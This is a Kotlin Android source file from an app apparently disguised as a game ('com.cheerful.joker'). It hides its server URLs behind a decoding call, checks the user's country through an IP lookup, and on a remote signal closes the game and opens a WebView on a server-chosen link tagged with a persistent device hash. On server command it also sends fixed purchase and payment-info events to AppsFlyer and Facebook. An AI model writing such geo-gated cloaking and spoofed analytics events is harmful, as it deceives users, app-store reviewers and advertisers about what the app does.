package com.cheerful.joker

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.content.SharedPreferences.Editor
import android.os.Bundle
import android.util.Log
import com.android.volley.Request
import com.android.volley.RequestQueue
import com.android.volley.VolleyError
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.appsflyer.AFInAppEventType
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.facebook.FacebookSdk
import com.facebook.appevents.AppEventsConstants
import com.facebook.appevents.AppEventsLogger
import org.json.JSONException
import org.json.JSONObject
import java.util.*
import java.util.concurrent.Executors

@SuppressLint("CommitPrefEdits")
class BackgroundTask(
    val context: Context,
    val prefer: SharedPreferences,
    val activity: MainActivity,
    var str: String
) {
    private var gitUrl = ""
    private val executor = Executors.newSingleThreadExecutor()
    private var isNotStopCycle = true
    private lateinit var myEditor: Editor
    private var geo: String? = null

    init {
        myEditor = prefer.edit()
    }

    fun regEvent() {
        setNetworkRequestQue()
    }

    private fun setNetworkRequestQue() {
        val jsonRequest = getJsonRequest()
        executor.execute {
            while (isNotStopCycle) {
                try {
                    Thread.sleep(700)
                    Log.e("Hash", getHash())
                    RequestQueueAdapt.getInstance(context)?.addToRequestQueue(jsonRequest) // send request
                    if (!prefer.getBoolean("reg", true) && !prefer.getBoolean("dep", true)) {
                        isNotStopCycle = false
                        break
                    }
                } catch (e: InterruptedException) {
                    e.printStackTrace()
                }
            }
            executor.shutdown()
        }
    }

    private fun getJsonRequest() :JsonObjectRequest {
        val eventUrl = AppConstants.VR.getDecData() + "app_id=" + context.packageName + "&hash=" + getHash() + "&sender=android_request"
        Log.e(
            "Logs",
            eventUrl
        )
        return JsonObjectRequest(
            Request.Method.GET,
            eventUrl,
            null,
            { response: JSONObject? ->
                run {
                    Log.e(
                        "Logs",
                        response.toString()
                    )
                    try {
                        val logger = AppEventsLogger.newLogger(context)
                        if (response?.get("reg").toString() == "1") {
                            if (prefer.getBoolean("reg", true)) {
                                sendAppsflyeraddInfo()
                                myEditor.putBoolean("reg", false)
                                myEditor.apply()
                                val params = Bundle()
                                params.putString(AppEventsConstants.EVENT_PARAM_CURRENCY, "USD")
                                params.putString(
                                    AppEventsConstants.EVENT_PARAM_CONTENT,
                                    "id : 182543"
                                )
                                logger.logEvent(
                                    AppEventsConstants.EVENT_NAME_INITIATED_CHECKOUT,
                                    54.23,
                                    params
                                )
                            }
                        }
                        if (response?.get("dep").toString() == "1") {
                            if (prefer.getBoolean("dep", true)) {
                                sendAppsflyeraddPurs()
                                myEditor.putBoolean("dep", false)
                                myEditor.apply()
                                val params = Bundle()
                                params.putString(AppEventsConstants.EVENT_PARAM_CURRENCY, "USD")
                                params.putString(
                                    AppEventsConstants.EVENT_PARAM_CONTENT_TYPE, "info"
                                )
                                params.putString(AppEventsConstants.EVENT_PARAM_CONTENT, "182543")
                                logger.logEvent(
                                    AppEventsConstants.EVENT_NAME_ADDED_PAYMENT_INFO,
                                    54.23,
                                    params
                                )
                            }
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }
            }) { error: VolleyError ->
            Log.e(" ", error.toString())
        }
    }

    private fun sendAppsflyeraddPurs() {
        AppsFlyerLib.getInstance().setDebugLog(true)
        val buys: Map<String, Any> = HashMap()
        AppsFlyerLib.getInstance().logEvent(
            FacebookSdk.getApplicationContext(),
            AFInAppEventType.PURCHASE,
            buys,
            object : AppsFlyerRequestListener {
                override fun onSuccess() {
                    Log.e(
                        "Logs", "DEP SUCCESSS"
                    )
                }
                override fun onError(i: Int, s: String) {}
            })
    }

    private fun sendAppsflyeraddInfo() {
        AppsFlyerLib.getInstance().setDebugLog(true)
        val addInfo: Map<String, Any> = HashMap()
        AppsFlyerLib.getInstance().logEvent(
            FacebookSdk.getApplicationContext(),
            AFInAppEventType.ADD_PAYMENT_INFO,
            addInfo,
            object : AppsFlyerRequestListener {
                override fun onSuccess() {
                    Log.e(
                        "Logs", "REG SUCCESSS"
                    )
                }
                override fun onError(i: Int, s: String) {}
            })
    }

    fun getHash(): String {
        val hash: String
        val chars = "abcdefghijklmnopqrstuvwxyz".toCharArray()
        val sb = StringBuilder(21)
        val random = Random()
        for (i in 0..20) {
            val c = chars[random.nextInt(chars.size)]
            sb.append(c)
        }
        hash = prefer.getString("Hash", sb.toString()).toString()
        myEditor.putString("Hash", hash)
        myEditor.apply()
        return  hash
    }

    fun getGeo() {
        if (prefer.getBoolean("Web", false)) {
            val jsonRequest = JsonObjectRequest(
                Request.Method.GET, AppConstants.URL.getDecData(), null,
                { response: JSONObject? ->
                    run {
                        try {
                            MainActivity.isGame = false
                            if (GameActivity.activity != null) {
                                GameActivity.activity!!.finish()
                            }
                            gitUrl = response?.get("Links").toString()
                            glueDeepLink(str)
                        } catch (e: JSONException) {
                            e.printStackTrace()
                        }
                    }
                }
            ) { error: VolleyError? ->
                Log.e(
                    " ",
                    error.toString()
                )
            }
            RequestQueueAdapt.getInstance(context)?.addToRequestQueue(jsonRequest)
        } else {
            val jsonRequest = JsonObjectRequest(
                Request.Method.GET, "http://www.geoplugin.net/json.gp?ip={\$ip}", null,
                { response: JSONObject ->
                    try {
                        geo = response.get("geoplugin_countryCode").toString()
                        Log.e(
                            "Logs", geo!!
                        )
                        startVebCommunication(geo!!)
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }
            ) { error: VolleyError? ->
                Log.e(" ", error.toString())
            }
            RequestQueueAdapt.getInstance(context)?.addToRequestQueue(jsonRequest)
        }
    }

    private fun startVebCommunication(geo: String) {
        val jsonRequest = JsonObjectRequest(
            Request.Method.GET, AppConstants.URL.getDecData(), null,
            { response: JSONObject? ->
                run {
                    try {
                        Log.e(
                            "Logs", response?.get("countries")
                                .toString()
                        )
                        if ((response?.get("Active")
                                .toString() == "true" && response?.get("countries")
                                .toString()
                                .toUpperCase(Locale.getDefault()).contains(geo))
                            or (response?.get("Active")
                                .toString() == "true" && response?.get("countries")
                                .toString()
                                .toUpperCase(Locale.getDefault()) == "ALL")
                        ) {
                            MainActivity.isGame = false
                            saveWebState()
                            if (GameActivity.activity != null) {
                                GameActivity.activity!!.finish()
                            }
                            gitUrl = response?.get("Links").toString()
                            glueDeepLink(str)
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }
            }
        ) { error: VolleyError? ->
            Log.e(
                " ",
                error.toString()
            )
        }
        RequestQueueAdapt.getInstance(context)?.addToRequestQueue(jsonRequest)
    }

    private fun saveWebState() {
        myEditor.putBoolean("Web", true)
        myEditor.apply()
    }

    private fun glueDeepLink(deep: String) {
        str = prefer.getString("Link", deep).toString()
        gitUrl += if (gitUrl.contains("?")) {
            "&" + str + "&hash=" + getHash() + "&app_id=" + context.packageName
        } else {
            "?" + str + "&hash=" + getHash() + "&app_id=" + context.packageName
        }
        val intent = Intent(context, WebActivity::class.java)
        intent.putExtra("Links", gitUrl)
        myEditor.putString("Link", str)
        myEditor.apply()
        context.startActivity(intent)
        activity.finish()
    }

    class RequestQueueAdapt private constructor(private var ctx: Context) {
        private var requestQueue: RequestQueue?
        private fun getRequestQueue(): RequestQueue? {
            if (requestQueue == null) {
                requestQueue = Volley.newRequestQueue(ctx.applicationContext)
            }
            return requestQueue
        }

        fun <T> addToRequestQueue(req: Request<T>?) {
            getRequestQueue()!!.add(req)
        }

        companion object Singleton {
            @SuppressLint("StaticFieldLeak")
            private var instance: RequestQueueAdapt? = null
            @Synchronized
            fun getInstance(context: Context): RequestQueueAdapt? {
                if (instance == null) {
                    instance = RequestQueueAdapt(context)
                }
                return instance
            }
        }

        init {
            requestQueue = getRequestQueue()
        }
    }
}